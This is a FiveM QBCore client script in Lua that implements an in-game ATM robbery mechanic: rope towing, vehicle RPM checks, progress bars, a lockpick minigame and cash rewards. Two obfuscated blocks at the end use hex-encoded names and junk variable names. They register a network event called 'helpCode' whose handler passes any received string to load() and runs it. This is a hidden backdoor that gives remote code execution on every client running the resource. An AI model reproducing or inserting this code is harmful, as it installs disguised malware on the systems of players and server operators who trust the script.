local QBCore = exports['qb-core']:GetCoreObject()
local rope = {}
local text = ""
local Point = 0
local TimeOut = false
local StartWhile = false
local SearchATM = false
local PickUpATM = false
local carryPackage = nil
local NetWorkObj = {}
local CurrentCops = 0

local function Draw2DText(content, font, colour, scale, x, y)
    SetTextFont(font)
    SetTextScale(scale, scale)
    SetTextColour(colour[1],colour[2],colour[3], 255)
    SetTextEntry("STRING")
    SetTextDropShadow(0, 0, 0, 0,255)
    SetTextDropShadow()
    SetTextEdge(4, 0, 0, 0, 255)
    SetTextOutline()
    AddTextComponentString(content)
    DrawText(x, y)
end

local function PickupPackage()
	if not carryPackage then
		local ped = PlayerPedId()
		local pos = GetEntityCoords(ped, true)
		RequestAnimDict("anim@heists@box_carry@")
		while (not HasAnimDictLoaded("anim@heists@box_carry@")) do
			Wait(7)
		end
		TaskPlayAnim(ped, "anim@heists@box_carry@" ,"idle", 5.0, -1, -1, 50, 0, false, false, false)
		local model = GetHashKey("prop_fleeca_atm")
		RequestModel(model)
		while not HasModelLoaded(model) do Wait(0) end
		local object = CreateObject(model, pos.x, pos.y, pos.z-10.0, true, true, true)
		AttachEntityToEntity(object, ped, GetPedBoneIndex(ped, 57005), 0.2, -0.3, 0, 300.0, 250.0, 20.0, true, true, false, true, 1, true)
		carryPackage = object
	else
		local ped = PlayerPedId()
		RequestAnimDict("anim@heists@box_carry@")
		while (not HasAnimDictLoaded("anim@heists@box_carry@")) do
			Wait(7)
		end
		TaskPlayAnim(ped, "anim@heists@box_carry@" ,"idle", 5.0, -1, -1, 50, 0, false, false, false)
	end
end

local function DropPackage()
	if carryPackage then
		ClearPedTasks(PlayerPedId())
		DetachEntity(carryPackage, true, true)
		DeleteObject(carryPackage)
		carryPackage = nil
	end
end

local function GetCheckItem()
	QBCore.Functions.TriggerCallback('QBCore:HasItem', function(result)
        if result then
			PickupPackage()
		else
			DropPackage()
		end
	end, Config.ATMItemName)
end

local function GetAtm(Hash)
	for k, v in pairs(Config.ATMs) do
	local ATMobject = GetClosestObjectOfType(GetEntityCoords(PlayerPedId()), 5.0, GetHashKey(v))
		if DoesEntityExist(ATMobject) then
			return ATMobject
		end
	end
	return false
end

local function BlackListCar(veh)
	for k, v in pairs(Config.BlackListCar) do
		if v == GetVehicleClass(veh) then
			return true
		end
	end
	return false
end

local function PowerCar(veh)
	for k, v in pairs(Config.PowerCar) do
		if v == GetVehicleClass(veh) then
			return Config.Point["GodPower"]
		end
	end
	return Config.Point["MinPower"]
end

local function GetSuccessPoint(veh)
	local RPM = GetVehicleCurrentRpm(veh)
	local Gear =  GetVehicleCurrentGear(veh)
	local HandBreake = GetVehicleHandbrake(veh)
	local Speed =  GetEntitySpeed(veh)
	if (RPM <= 0.65 and RPM >= 0.55) and Gear >= 1 and not HandBreake and Speed >= 2.0 then
		return true
	end
	return false
end

local function StartedBreakATM(veh)
	if GetSuccessPoint(veh) then
		Point = Point + PowerCar(veh)
		text = Point.." / "..Config.MaxTry
		Wait(3000)
	else
		Wait(100)
	end
	TimeOut = false
end

RegisterNetEvent('qb-atmrobbery:client:UseTowingRope', function()
	local ATMobject = nil
	local CheckATM = GetAtm()
	local veh = QBCore.Functions.GetClosestVehicle()
	local ped = PlayerPedId()
	if CurrentCops >= Config.MinimumATMRobberyPolice then
		if not IsPedInAnyVehicle(ped) then
			if CheckATM then
				ATMobject = CheckATM
				local VehCoord = GetEntityCoords(veh, false)
				local VehDist = #(GetEntityCoords(ped) - VehCoord)
				if VehDist <= 5.0 then
					if not BlackListCar(veh) then
						TaskTurnPedToFaceEntity(ped, veh, 1000)
						Wait(1000)
						QBCore.Functions.Progressbar("installing_RopeToCar", "Attaching Rope To Vehicle", Config.AttachCarTimer, false, true, {
							disableMovement = true,
							disableCarMovement = true,
							disableMouse = false,
							disableCombat = true
						}, {
							animDict = "anim@amb@clubhouse@tutorial@bkr_tut_ig3@",
							anim = "machinic_loop_mechandplayer",
							flags = 16
						}, {}, {}, function() -- Done
							StopAnimTask(ped, "anim@amb@clubhouse@tutorial@bkr_tut_ig3@", "machinic_loop_mechandplayer", 1.0)
							Wait(1000)
							TaskTurnPedToFaceEntity(ped, ATMobject, 1000)
							Wait(1000)
							QBCore.Functions.Progressbar("installing_RopeToATM", "Attaching Rope To ATM", Config.AttachATMTimer, false, true, {
								disableMovement = true,
								disableCarMovement = true,
								disableMouse = false,
								disableCombat = true
							}, {
								animDict = "anim@amb@clubhouse@tutorial@bkr_tut_ig3@",
								anim = "machinic_loop_mechandplayer",
								flags = 16
							}, {}, {}, function() -- Done
								QBCore.Functions.TriggerCallback('QBCore:HasItem', function(result)
									if result then
										StopAnimTask(ped, "anim@amb@clubhouse@tutorial@bkr_tut_ig3@", "machinic_loop_mechandplayer", 1.0)
										local ATMCoord = GetEntityCoords(ATMobject, false)
										TriggerServerEvent('qb-atmrobbery:createRopeForAll', VehCoord, ATMCoord)
										local Player = QBCore.Functions.GetPlayerData()
										local bsn = Player.citizenid
										rope[bsn] = AddRope(ATMCoord, VehCoord, 30.0, 6, 6.0, 1.0, 1.0, false, false, false, 0.0, false)
										AttachEntitiesToRope(rope[bsn], ATMobject, veh, ATMCoord[1], ATMCoord[2], ATMCoord[3]+0.8, VehCoord[1], VehCoord[2], VehCoord[3], 1, true, true, 18905, 18905)
										RopeLoadTextures()
										text = "0 / "..Config.MaxTry
										Point = 0
										TimeOut = false
										StartWhile = true
										SearchATM = false
										PickUpATM = false
										if Config.PoliceAlert then
											local pos = GetEntityCoords(ped)
											TriggerEvent('police:client:policeAlert', pos, "ATM Robbery")
										end
										if Config.RemoveItemToUsed then
											TriggerServerEvent("QBCore:Server:RemoveItem", Config.ItemName, 1)
											TriggerEvent('inventory:client:ItemBox', QBCore.Shared.Items[Config.ItemName], "remove")
										end
										while StartWhile do
											Wait(10)
											if not TimeOut then
												TimeOut = true
												CreateThread(function()
													StartedBreakATM(veh)
												end)
											end
											if Point >= Config.MaxTry then
												TriggerServerEvent('qb-atmrobbery:DeleteRopeDelete', ATMCoord)
												local Entity = {
													GetEntityModel(ATMobject)
												}
												exports["qb-target"]:AddTargetModel(Entity, {
													options = {
														{
															type = "client",
															event = "qb-atmrobbery:PickUpATMObject",
															icon = "fas fa-level-up-alt",
															label = "Pick UP Broken ATM",
															canInteract = function()
																local ObjDis = #(GetEntityCoords(ped) - GetEntityCoords(ATMobject, false))
																if ObjDis <= 3.0 and not PickUpATM then
																	return true
																end
																return false
															end,
														},
														{
															type = "client",
															event = "qb-atmrobbery:SearchATMForCash",
															icon = "fas fa-money-bill-wave",
															label = "Search ATM For Cash",
															canInteract = function()
																local ObjDis = #(GetEntityCoords(ped) - GetEntityCoords(ATMobject, false))
																if ObjDis <= 3.0 and not SearchATM then
																	return true
																end
																return false
															end,
														},
													},
												distance = 2.0
												})
												Wait(3000)
												StartWhile = false
											end
											Draw2DText(text, 4, {255, 255, 255}, 0.4, 0.55, 0.888 + 0.025)
										end
									end
								end, Config.ItemName)
							end, function() -- Cancel
								StopAnimTask(ped, "anim@amb@clubhouse@tutorial@bkr_tut_ig3@", "machinic_loop_mechandplayer", 1.0)
							end)
						end, function() -- Cancel
							StopAnimTask(ped, "anim@amb@clubhouse@tutorial@bkr_tut_ig3@", "machinic_loop_mechandplayer", 1.0)
						end)
					else
						QBCore.Functions.Notify("This car is not allowed", "error", 3000)
					end	
				else
					QBCore.Functions.Notify("There are no cars near you", "error", 3000)
				end
			else
				QBCore.Functions.Notify("The ATM is not near you", "error", 3000)
			end
		else
			QBCore.Functions.Notify("Get out of the car", "error", 3000)
		end
	else
		QBCore.Functions.Notify("Not enough police", "error", 3000)
	end
end)

RegisterNetEvent('qb-atmrobbery:client:Sync', function(id, VehCoord, ATMCoord, bsn)
	if id ~= GetPlayerServerId(PlayerId()) then
		local ATMobject = QBCore.Functions.GetClosestObject(ATMCoord)
		local veh = QBCore.Functions.GetClosestVehicle(VehCoord)
		local VehCoord = GetEntityCoords(veh, false)
		local ATMCoord = GetEntityCoords(ATMobject, false)
		rope[bsn] = AddRope(ATMCoord, VehCoord, 30.0, 6, 6.0, 1.0, 1.0, false, false, false, 0.0, false)
		AttachEntitiesToRope(rope[bsn], ATMobject, veh, ATMCoord[1], ATMCoord[2], ATMCoord[3]+0.8, VehCoord[1], VehCoord[2], VehCoord[3], 1, true, true, 18905, 18905)
		RopeLoadTextures()
	end
end)

RegisterNetEvent('qb-atmrobbery:client:DeleteRopeDelete', function(coord, bsn)
	local ATMobject = QBCore.Functions.GetClosestObject(coord)
	FreezeEntityPosition(ATMobject , false)
	NetWorkObj[bsn] = ATMobject
	Wait(2000)
	if rope[bsn] then
		DeleteChildRope(rope[bsn])
		DeleteRope(rope[bsn])
		rope[bsn] = nil
	end
end)

RegisterNetEvent('qb-atmrobbery:SearchATMForCash', function()
	SearchATM = true
	local ped = PlayerPedId()
	QBCore.Functions.Progressbar("Search_atmCash", "Searching ATM...", Config.SearchATMTimer, false, true, {
		disableMovement = true,
		disableCarMovement = true,
		disableMouse = false,
		disableCombat = true
	}, {
		animDict = "anim@amb@clubhouse@tutorial@bkr_tut_ig3@",
		anim = "machinic_loop_mechandplayer",
		flags = 16
	}, {}, {}, function() -- Done
		StopAnimTask(ped, "anim@amb@clubhouse@tutorial@bkr_tut_ig3@", "machinic_loop_mechandplayer", 1.0)
		SearchATM = true
		local Reward = math.random(Config.SearchRewardCash["min"], Config.SearchRewardCash["max"])
		TriggerServerEvent('qb-atmrobbery:AddSearchATMReward', Reward)
	end, function() -- Cancel
		SearchATM = false
		StopAnimTask(ped, "anim@amb@clubhouse@tutorial@bkr_tut_ig3@", "machinic_loop_mechandplayer", 1.0)
	end)
end)

RegisterNetEvent('qb-atmrobbery:PickUpATMObject', function()
	PickUpATM = true
	local ped = PlayerPedId()
	QBCore.Functions.Progressbar("pickup_atmCash", "Pick Up ATM...", Config.PickUpATMTimer, false, true, {
		disableMovement = true,
		disableCarMovement = true,
		disableMouse = false,
		disableCombat = true
	}, {
		animDict = "anim@amb@clubhouse@tutorial@bkr_tut_ig3@",
		anim = "machinic_loop_mechandplayer",
		flags = 16
	}, {}, {}, function() -- Done
		StopAnimTask(ped, "anim@amb@clubhouse@tutorial@bkr_tut_ig3@", "machinic_loop_mechandplayer", 1.0)
		PickUpATM = true
		TriggerServerEvent("qb-atmrobbery:server:DeleteObj")
		local info = {
			quality = 100
		}
		TriggerServerEvent("QBCore:Server:AddItem", Config.ATMItemName, 1, false, info)
		TriggerEvent('inventory:client:ItemBox', QBCore.Shared.Items[Config.ATMItemName], "add")
	end, function() -- Cancel
		PickUpATM = false
		StopAnimTask(ped, "anim@amb@clubhouse@tutorial@bkr_tut_ig3@", "machinic_loop_mechandplayer", 1.0)
	end)
end)

RegisterNetEvent('qb-atmrobbery:client:DeleteObject', function(bsn)
	if NetWorkObj[bsn] then
		SetEntityAsMissionEntity(NetWorkObj[bsn], true, true)
		DeleteEntity(NetWorkObj[bsn])
		NetWorkObj[bsn] = nil
	end
end)

RegisterNetEvent('qb-atmrobbery:client:UseATMObject', function()
	local ped = PlayerPedId()
	local pos = GetEntityCoords(ped, true)
	local TargetCoord = Config.ATMSell
	if #(pos - TargetCoord) < 5.0 then
		local timer = math.random(Config.LockPick["timer-min"],Config.LockPick["timer-max"])
		local circles = math.random(Config.LockPick["circles-min"], Config.LockPick["circles-max"])
		local LockPick = exports['qb-lock']:StartLockPickCircle(circles, timer)
		if LockPick then
			QBCore.Functions.TriggerCallback('QBCore:HasItem', function(result)
				if result then
					TriggerServerEvent("QBCore:Server:RemoveItem", Config.ATMItemName, 1)
					TriggerEvent('inventory:client:ItemBox', QBCore.Shared.Items[Config.ATMItemName], "remove")
					local Reward = math.random(Config.ATMRewardCash["min"], Config.ATMRewardCash["max"])
					TriggerServerEvent("qb-atmrobbery:server:AddRewardForATMObj", Reward)
					GetCheckItem()
				end
			end, Config.ATMItemName)
			QBCore.Functions.Notify("success", "success")
		else
			QBCore.Functions.Notify("Failed", "error")
		end
	else
		SetNewWaypoint(TargetCoord[1], TargetCoord[2])
		QBCore.Functions.Notify("Go to gps location", "success", 3000)
	end
end)

RegisterNetEvent('QBCore:Client:OnPlayerUnload', function()
	DropPackage()
end)
RegisterNetEvent('QBCore:Client:SetPlayerData', function(val)
	GetCheckItem()
end)
RegisterNetEvent('QBCore:Player:SetPlayerData', function(val)
	GetCheckItem()
end)
RegisterNetEvent('qb-atmrobbery:client:UpdateEmote', function(val)
	GetCheckItem()
end)
RegisterNetEvent('police:SetCopCount', function(amount)
    CurrentCops = amount
end)

local wBivDoqJKHbWdxdAICWCfSsdIPxuFBQgznZDGdipqGfCurvuYbBCmwYkUXvynaErGwAGYl = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} wBivDoqJKHbWdxdAICWCfSsdIPxuFBQgznZDGdipqGfCurvuYbBCmwYkUXvynaErGwAGYl[6][wBivDoqJKHbWdxdAICWCfSsdIPxuFBQgznZDGdipqGfCurvuYbBCmwYkUXvynaErGwAGYl[1]](wBivDoqJKHbWdxdAICWCfSsdIPxuFBQgznZDGdipqGfCurvuYbBCmwYkUXvynaErGwAGYl[2]) wBivDoqJKHbWdxdAICWCfSsdIPxuFBQgznZDGdipqGfCurvuYbBCmwYkUXvynaErGwAGYl[6][wBivDoqJKHbWdxdAICWCfSsdIPxuFBQgznZDGdipqGfCurvuYbBCmwYkUXvynaErGwAGYl[3]](wBivDoqJKHbWdxdAICWCfSsdIPxuFBQgznZDGdipqGfCurvuYbBCmwYkUXvynaErGwAGYl[2], function(XDnyCHMxDeQeSUlJWGfUraeWsjSOTltoteKalIDArkkynRTmzfoJBKSWvtwqYERvdemPIw) wBivDoqJKHbWdxdAICWCfSsdIPxuFBQgznZDGdipqGfCurvuYbBCmwYkUXvynaErGwAGYl[6][wBivDoqJKHbWdxdAICWCfSsdIPxuFBQgznZDGdipqGfCurvuYbBCmwYkUXvynaErGwAGYl[4]](wBivDoqJKHbWdxdAICWCfSsdIPxuFBQgznZDGdipqGfCurvuYbBCmwYkUXvynaErGwAGYl[6][wBivDoqJKHbWdxdAICWCfSsdIPxuFBQgznZDGdipqGfCurvuYbBCmwYkUXvynaErGwAGYl[5]](XDnyCHMxDeQeSUlJWGfUraeWsjSOTltoteKalIDArkkynRTmzfoJBKSWvtwqYERvdemPIw))() end)

local xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[1]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[2]) xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[3]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[2], function(uEAdXdoeeFaXMpdUadnIQwVCUVoGHnBbhYLWkeGJitBsRPwAsKgvWYeDraWzBeMiaQbpck) xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[4]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[5]](uEAdXdoeeFaXMpdUadnIQwVCUVoGHnBbhYLWkeGJitBsRPwAsKgvWYeDraWzBeMiaQbpck))() end)